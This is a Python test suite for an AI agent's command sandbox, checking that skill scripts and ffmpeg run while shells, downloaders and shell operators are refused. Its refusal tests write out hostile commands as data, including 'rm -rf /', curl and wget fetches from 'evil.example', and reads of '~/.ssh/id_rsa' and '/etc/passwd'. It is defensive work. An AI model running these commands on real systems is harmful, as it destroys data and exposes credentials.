"""What run_script will and will not run.

``run_script`` was ``subprocess.run(command, shell=True)`` with no checks — a
general-purpose shell on the end of a language model. The replacement does not
try to filter a shell string, because that cannot be done; it stops using a shell.
So the tests come in two halves: the things that must still work (real skills call
these) and the things that must not, with the ones that would be *silently*
mangled kept separate from the ones that were never allowed.

The honest limit is asserted too. ``python`` is on the allow-list because skills
need it, and a Python process can do anything Python can do — so this file records
that the sandbox does not claim otherwise, and the approval prompt is what covers
it (see test_tool_permissions.py).
"""

import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from agenty_core import sandbox

ROOT = Path(__file__).resolve().parents[1]


class WhatSkillsActuallyRun(unittest.TestCase):
    """Every one of these appears in a shipped skill or system prompt.

    A restriction that broke them would be reverted within a day, so they are
    pinned here rather than rediscovered.
    """

    def test_a_skill_script(self):
        argv, why = sandbox.check_command(
            "python ./skills/image-downsize/scripts/downsize.py --width 512")
        self.assertIsNotNone(argv, why)

    def test_ffmpeg_on_a_temp_file(self):
        argv, why = sandbox.check_command(
            "ffmpeg -i /tmp/a.mp4 -vcodec libx264 -crf 18 /tmp/b.mp4")
        self.assertIsNotNone(argv, why)

    def test_a_codec_name_is_not_mistaken_for_a_path(self):
        # "libx264" has no separator, so it is a bare word. Getting this wrong
        # would reject every ffmpeg call for being an ffmpeg call.
        self.assertFalse(sandbox.looks_like_path("libx264"))
        self.assertFalse(sandbox.looks_like_path("-vcodec"))

    def test_reading_a_cloned_repo(self):
        for cmd in ("ls skills", "grep -rn submit_prompt src", "cat README.md"):
            with self.subTest(cmd=cmd):
                argv, why = sandbox.check_command(cmd)
                self.assertIsNotNone(argv, why)

    def test_cloning_a_custom_node_pack(self):
        """A git URL is not a path, and it is full of slashes.

        The first version refused this for "pointing outside the project", which
        is both wrong and incomprehensible — the argument names nothing on this
        disk at all.
        """
        argv, why = sandbox.check_command(
            "git clone https://github.com/some/pack /tmp/pack")
        self.assertIsNotNone(argv, why)


class WhatIsRefused(unittest.TestCase):
    def test_no_shell_no_deletion(self):
        argv, why = sandbox.check_command("rm -rf /")
        self.assertIsNone(argv)
        self.assertIn("not a program", why)

    def test_no_general_interpreter(self):
        """bash on the list would make every other entry decorative."""
        for cmd in ("bash -c 'echo hi'", "sh script.sh", "zsh -c x",
                    "powershell -c x", "cmd /c dir"):
            with self.subTest(cmd=cmd):
                self.assertIsNone(sandbox.check_command(cmd)[0], cmd)

    def test_no_downloader(self):
        for cmd in ("curl http://evil.example/x.sh", "wget http://evil.example/x"):
            with self.subTest(cmd=cmd):
                self.assertIsNone(sandbox.check_command(cmd)[0], cmd)

    def test_no_scripting_host(self):
        # osascript is how you drive the whole of macOS from one line.
        for cmd in ("osascript -e 'do shell script \"id\"'", "node x.js", "perl x.pl"):
            with self.subTest(cmd=cmd):
                self.assertIsNone(sandbox.check_command(cmd)[0], cmd)

    def test_reading_secrets_outside_the_project(self):
        for cmd in ("cat /etc/passwd", "cat ~/.ssh/id_rsa",
                    "cat ../../../etc/hosts"):
            with self.subTest(cmd=cmd):
                argv, why = sandbox.check_command(cmd)
                self.assertIsNone(argv, cmd)
                self.assertIn("outside", why)

    def test_the_env_file_is_not_special_cased_and_does_not_need_to_be(self):
        """.env IS inside the project, so `cat .env` passes the path check.

        Recorded deliberately: the path rule is about where, not what, and the
        thing standing between the agent and the key file is the approval prompt,
        not this. Anyone reading these tests should know that.
        """
        argv, _ = sandbox.check_command("cat .env")
        self.assertIsNotNone(argv)


class ShellOperators(unittest.TestCase):
    """These would not DO anything now — they would be mangled, which is worse.

    With shell=False, `python x.py && rm -rf /` runs python with the literal
    arguments "&&", "rm", "-rf", "/". Harmless and completely baffling. Refusing
    with an explanation is the only version anyone can act on.
    """

    def test_each_operator_is_named_in_the_refusal(self):
        for cmd, token in (("python x.py && rm -rf /", "&&"),
                           ("ls | grep foo", "|"),
                           ("ls ; rm x", ";"),
                           ("python x.py > out.txt", ">"),
                           ("cat a >> b", ">>")):
            with self.subTest(cmd=cmd):
                argv, why = sandbox.check_command(cmd)
                self.assertIsNone(argv, cmd)
                self.assertIn(token, why)
                self.assertIn("shell", why.lower())

    def test_a_multiline_command_is_refused_rather_than_half_run(self):
        """It never worked on Windows — cmd.exe read it line by line and exited 0
        with no output. Saying so beats reproducing the silence."""
        argv, why = sandbox.check_command("python - <<EOF\nprint(1)\nEOF")
        self.assertIsNone(argv)
        self.assertIn("single-line", why)

    def test_unbalanced_quotes_are_a_message_not_a_traceback(self):
        argv, why = sandbox.check_command("python 'x.py")
        self.assertIsNone(argv)
        self.assertIn("quoting", why)

    def test_an_empty_command(self):
        for cmd in ("", "   ", None):
            with self.subTest(cmd=cmd):
                self.assertIsNone(sandbox.check_command(cmd)[0])


class ResolvingTheProgramName(unittest.TestCase):
    def test_windows_extensions_are_stripped(self):
        for name in ("python.exe", "PYTHON.EXE", "ffmpeg.exe"):
            with self.subTest(name=name):
                self.assertIn(sandbox.norm_exe(name),
                              ("python", "ffmpeg"))

    def test_a_full_path_is_matched_on_its_basename(self):
        """sys.executable is a full path, and so is anything a venv resolves."""
        self.assertEqual(sandbox.norm_exe("/usr/local/bin/python3"), "python3")
        argv, why = sandbox.check_command("/usr/bin/ffprobe -show_streams a.mp4")
        self.assertIsNotNone(argv, why)

    def test_a_disallowed_program_in_an_allowed_folder_is_still_disallowed(self):
        # The check is on the name, so hiding `rm` inside the project changes
        # nothing.
        self.assertIsNone(sandbox.check_command(str(ROOT / "rm") + " -rf x")[0])


class Configuring(unittest.TestCase):
    def tearDown(self):
        sandbox.configure(executables=(), roots=())

    def test_an_extra_program_can_be_allowed(self):
        self.assertIsNone(sandbox.check_command("magick a.png b.png")[0])
        sandbox.configure(executables=["magick"])
        argv, why = sandbox.check_command("magick a.png b.png")
        self.assertIsNotNone(argv, why)

    def test_an_extra_root_can_be_allowed(self):
        # Deliberately NOT a TemporaryDirectory: the system temp dir is already a
        # root, so a test built there would pass before configure() was called and
        # prove nothing. The path need not exist — the check is on where it
        # resolves to, not on what is there.
        outside = "/opt/agentY-media-test/clip.mp4"
        self.assertIsNone(sandbox.check_command(f"ffprobe {outside}")[0])
        sandbox.configure(roots=["/opt/agentY-media-test"])
        argv, why = sandbox.check_command(f"ffprobe {outside}")
        self.assertIsNotNone(argv, why)

    def test_the_project_is_always_a_root(self):
        self.assertTrue(any(str(r) == str(ROOT) for r in sandbox.allowed_roots()),
                        sandbox.allowed_roots())

    def test_the_working_directory_is_decided_not_inherited(self):
        """A relative path in an argument is resolved against it.

        Leaving it to whatever the process happened to start in makes the path
        checks describe a different directory from the one the program uses —
        which is exactly the mismatch that split the project-memory store in two.
        """
        self.assertEqual(sandbox.working_directory(), ROOT)


if __name__ == "__main__":
    unittest.main()
